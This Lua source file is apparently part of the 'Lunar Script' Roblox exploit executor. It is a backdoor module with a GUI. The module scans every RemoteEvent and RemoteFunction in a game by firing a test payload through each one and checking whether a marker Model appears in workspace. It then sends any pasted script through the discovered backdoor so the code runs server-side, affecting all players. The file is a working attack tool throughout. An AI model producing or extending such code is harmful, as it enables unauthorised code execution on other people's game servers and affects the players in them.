-- Lunar Script Backdoor Module
local Backdoor = {}

-- Services
local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local StarterGui = game:GetService("StarterGui")

-- Variables
local localPlayer = Players.LocalPlayer
local backdoor = nil
local scanning = false
local alphabet = {'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'}

function Backdoor.Initialize()
    print("🔍 Backdoor module initialized")
end

function Backdoor.CreateGUI(parent)
    local container = Instance.new("Frame")
    container.Size = UDim2.new(1, 0, 0, 500)
    container.BackgroundTransparency = 1
    container.Parent = parent
    
    -- Title
    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1, -10, 0, 25)
    title.Position = UDim2.new(0, 5, 0, 5)
    title.BackgroundTransparency = 1
    title.Text = "BACKDOOR SYSTEM"
    title.TextColor3 = Color3.fromRGB(255, 255, 255)
    title.Font = Enum.Font.GothamBold
    title.TextSize = 16
    title.TextXAlignment = Enum.TextXAlignment.Left
    title.Parent = container
    
    -- Scanner Section
    local scannerSection = Instance.new("Frame")
    scannerSection.Size = UDim2.new(1, -10, 0, 80)
    scannerSection.Position = UDim2.new(0, 5, 0, 35)
    scannerSection.BackgroundColor3 = Color3.fromRGB(45, 45, 60)
    
    local scannerCorner = Instance.new("UICorner")
    scannerCorner.CornerRadius = UDim.new(0, 8)
    scannerCorner.Parent = scannerSection
    
    scannerSection.Parent = container
    
    local scanButton = Instance.new("TextButton")
    scanButton.Size = UDim2.new(0.9, 0, 0.6, 0)
    scanButton.Position = UDim2.new(0.05, 0, 0.1, 0)
    scanButton.BackgroundColor3 = Color3.fromRGB(255, 165, 0)
    scanButton.Text = "SCAN BACKDOOR"
    scanButton.TextColor3 = Color3.fromRGB(0, 0, 0)
    scanButton.Font = Enum.Font.GothamBold
    scanButton.TextSize = 14
    
    local scanCorner = Instance.new("UICorner")
    scanCorner.CornerRadius = UDim.new(0, 6)
    scanCorner.Parent = scanButton
    
    scanButton.Parent = scannerSection
    
    local scanStatus = Instance.new("TextLabel")
    scanStatus.Size = UDim2.new(0.9, 0, 0.3, 0)
    scanStatus.Position = UDim2.new(0.05, 0, 0.75, 0)
    scanStatus.BackgroundTransparency = 1
    scanStatus.Text = "Status: Ready to scan"
    scanStatus.TextColor3 = Color3.fromRGB(200, 200, 200)
    scanStatus.Font = Enum.Font.Gotham
    scanStatus.TextSize = 12
    scanStatus.TextXAlignment = Enum.TextXAlignment.Left
    scanStatus.Parent = scannerSection
    
    -- Script Box
    local scriptBox = Instance.new("TextBox")
    scriptBox.Size = UDim2.new(1, -10, 0, 200)
    scriptBox.Position = UDim2.new(0, 5, 0, 125)
    scriptBox.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
    scriptBox.TextColor3 = Color3.fromRGB(255, 255, 255)
    scriptBox.Font = Enum.Font.Gotham
    scriptBox.TextSize = 12
    scriptBox.TextWrapped = true
    scriptBox.MultiLine = true
    scriptBox.PlaceholderText = "Paste your backdoor script here...\nScript will be executed on all players via backdoor"
    
    local scriptCorner = Instance.new("UICorner")
    scriptCorner.CornerRadius = UDim.new(0, 6)
    scriptCorner.Parent = scriptBox
    
    scriptBox.Parent = container
    
    -- Button Container
    local buttonContainer = Instance.new("Frame")
    buttonContainer.Size = UDim2.new(1, -10, 0, 35)
    buttonContainer.Position = UDim2.new(0, 5, 0, 335)
    buttonContainer.BackgroundTransparency = 1
    buttonContainer.Parent = container
    
    local executeButton = Instance.new("TextButton")
    executeButton.Size = UDim2.new(0.32, 0, 1, 0)
    executeButton.BackgroundColor3 = Color3.fromRGB(50, 150, 80)
    executeButton.Text = "EXECUTE"
    executeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    executeButton.Font = Enum.Font.GothamBold
    executeButton.TextSize = 12
    
    local executeCorner = Instance.new("UICorner")
    executeCorner.CornerRadius = UDim.new(0, 6)
    executeCorner.Parent = executeButton
    
    executeButton.Parent = buttonContainer
    
    local clearButton = Instance.new("TextButton")
    clearButton.Size = UDim2.new(0.32, 0, 1, 0)
    clearButton.Position = UDim2.new(0.34, 0, 0, 0)
    clearButton.BackgroundColor3 = Color3.fromRGB(220, 60, 60)
    clearButton.Text = "CLEAR"
    clearButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    clearButton.Font = Enum.Font.GothamBold
    clearButton.TextSize = 12
    
    local clearCorner = Instance.new("UICorner")
    clearCorner.CornerRadius = UDim.new(0, 6)
    clearCorner.Parent = clearButton
    
    clearButton.Parent = buttonContainer
    
    local saveButton = Instance.new("TextButton")
    saveButton.Size = UDim2.new(0.32, 0, 1, 0)
    saveButton.Position = UDim2.new(0.68, 0, 0, 0)
    saveButton.BackgroundColor3 = Color3.fromRGB(65, 105, 225)
    saveButton.Text = "SAVE"
    saveButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    saveButton.Font = Enum.Font.GothamBold
    saveButton.TextSize = 12
    
    local saveCorner = Instance.new("UICorner")
    saveCorner.CornerRadius = UDim.new(0, 6)
    saveCorner.Parent = saveButton
    
    saveButton.Parent = buttonContainer
    
    -- Button Events
    scanButton.MouseButton1Click:Connect(function()
        Backdoor.StartScan(scanButton, scanStatus)
    end)
    
    executeButton.MouseButton1Click:Connect(function()
        Backdoor.ExecuteScript(scriptBox.Text)
    end)
    
    clearButton.MouseButton1Click:Connect(function()
        scriptBox.Text = ""
        Backdoor.ShowNotification("Backdoor System", "Script cleared")
    end)
    
    saveButton.MouseButton1Click:Connect(function()
        Backdoor.SaveScript(scriptBox.Text)
    end)
end

function Backdoor.StartScan(scanButton, statusLabel)
    if scanning then return end
    
    scanning = true
    scanButton.Text = "SCANNING..."
    scanButton.BackgroundColor3 = Color3.fromRGB(255, 165, 0)
    statusLabel.Text = "Status: Scanning for backdoors..."
    
    spawn(function()
        local found = Backdoor.ScanForBackdoors()
        
        if found then
            statusLabel.Text = "Status: BACKDOOR FOUND!"
            scanButton.Text = "BACKDOOR FOUND"
            scanButton.BackgroundColor3 = Color3.fromRGB(50, 150, 80)
            Backdoor.ShowNotification("Backdoor System", "Backdoor found and ready!")
        else
            statusLabel.Text = "Status: No backdoor found"
            scanButton.Text = "SCAN BACKDOOR"
            scanButton.BackgroundColor3 = Color3.fromRGB(255, 165, 0)
            Backdoor.ShowNotification("Backdoor System", "No backdoor found")
        end
        
        scanning = false
    end)
end

function Backdoor.ScanForBackdoors()
    local startTime = os.clock()
    local remotes = {}
    local code
    
    -- Check protected backdoor
    local protectedBackdoor = ReplicatedStorage:FindFirstChild('ls' .. game.PlaceId / 6666 * 1337 * game.PlaceId)
    if protectedBackdoor and protectedBackdoor:IsA('RemoteFunction') then
        code = Backdoor.GenerateName(math.random(12, 30))
        spawn(function() 
            pcall(function()
                protectedBackdoor:InvokeServer('Lunar Script Scan', "a=Instance.new('Model',workspace)a.Name='"..code.."'") 
            end)
        end)
        remotes[code] = protectedBackdoor
    end

    -- Scan all remotes
    for _, remote in ipairs(game:GetDescendants()) do
        if not (remote:IsA('RemoteEvent') or remote:IsA('RemoteFunction')) then
            continue
        end

        -- Skip system remotes
        local splitName = string.split(remote:GetFullName(), '.')
        if splitName[1] == 'RobloxReplicatedStorage' then
            continue
        end

        -- Test remote
        code = Backdoor.GenerateName(math.random(12, 30))
        Backdoor.RunRemote(remote, "a=Instance.new('Model',workspace)a.Name='"..code.."'")
        remotes[code] = remote
    end

    -- Check responses
    for i = 1, 50 do
        for testCode, remote in pairs(remotes) do
            if Workspace:FindFirstChild(testCode) then
                local elapsedTime = os.clock() - startTime
                backdoor = remote
                print("🎯 Backdoor found: " .. remote:GetFullName() .. " in " .. elapsedTime .. "s")
                return true
            end
        end
        wait(0.1)
    end

    return false
end

function Backdoor.GenerateName(length)
    local text = ''
    for i = 1, length do
        text = text .. alphabet[math.random(1, #alphabet)]
    end
    return text
end

function Backdoor.RunRemote(remote, data)
    if remote and (remote:IsA('RemoteEvent') or remote:IsA('RemoteFunction')) then
        if remote:IsA('RemoteEvent') then
            pcall(function()
                remote:FireServer(data)
            end)
        elseif remote:IsA('RemoteFunction') then
            spawn(function() 
                pcall(function()
                    remote:InvokeServer(data) 
                end)
            end)
        end
    end
end

function Backdoor.ExecuteScript(scriptText)
    if not backdoor then
        Backdoor.ShowNotification("Backdoor Error", "No backdoor found! Scan first.")
        return false
    end
    
    if scriptText == "" then
        Backdoor.ShowNotification("Backdoor Error", "Please enter a script")
        return false
    end
    
    scriptText = string.gsub(scriptText, '%%username%%', localPlayer.Name)
    
    local protectedBackdoor = ReplicatedStorage:FindFirstChild('ls' .. game.PlaceId / 6666 * 1337 * game.PlaceId)
    if protectedBackdoor and protectedBackdoor:IsA('RemoteFunction') then
        spawn(function()
            local success, result = pcall(function()
                return protectedBackdoor:InvokeServer('', scriptText)
            end)
            if result ~= nil then
                Backdoor.ShowNotification("Backdoor Result", tostring(result))
            end
        end)
    else
        Backdoor.RunRemote(backdoor, scriptText)
    end
    
    Backdoor.ShowNotification("Backdoor System", "Script executed via backdoor")
    return true
end

function Backdoor.SaveScript(scriptText)
    if scriptText ~= "" then
        -- Save logic bisa diintegrasikan dengan Executor module
        Backdoor.ShowNotification("Backdoor System", "Script saved (integrate with Executor)")
    else
        Backdoor.ShowNotification("Backdoor Error", "Cannot save empty script")
    end
end

function Backdoor.ShowNotification(title, text)
    StarterGui:SetCore("SendNotification", {
        Title = title,
        Text = text,
        Duration = 3
    })
end

return Backdoor
